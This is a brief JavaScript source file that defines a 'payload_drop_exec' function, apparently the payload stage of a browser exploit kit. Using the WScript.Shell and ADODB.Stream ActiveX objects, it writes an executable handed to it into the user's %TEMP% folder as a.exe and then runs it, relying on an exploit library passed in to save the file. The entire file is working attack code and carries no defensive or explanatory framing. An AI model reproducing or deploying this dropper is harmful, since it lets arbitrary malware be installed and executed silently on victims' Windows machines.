function payload_drop_exec(pe) {

	this.execute = function(explib) {
	
		var WshShell = new ActiveXObject("WScript.shell");
		var temp = WshShell.ExpandEnvironmentStrings("%TEMP%");
		var filename = temp + "\\a.exe";

		var bStream = new ActiveXObject("ADODB.Stream");
		var txtStream = new ActiveXObject("ADODB.Stream");
		bStream.Type = 1;
		txtStream.Type = 2;


		bStream.Open();
		txtStream.Open();

		txtStream.WriteText(pe);
		txtStream.Position = 2;
		txtStream.CopyTo( bStream );
		txtStream.Close();

		alert(filename);

		explib.saveToFile(bStream, filename);
		//bStream.SaveToFile(filename, 2);
		bStream.Close();

		
		oExec = WshShell.Exec(filename);
	}

	return this;
}